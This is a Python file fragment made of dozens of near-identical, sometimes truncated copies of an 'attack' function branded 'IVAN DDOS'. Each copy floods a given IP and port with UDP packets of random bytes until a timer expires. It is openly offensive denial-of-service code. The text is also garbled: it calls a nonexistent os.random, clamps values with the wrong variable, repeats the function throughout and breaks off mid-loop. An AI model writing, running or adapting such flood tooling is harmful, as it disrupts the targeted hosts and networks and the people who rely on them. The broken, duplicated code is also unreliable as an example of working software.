    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
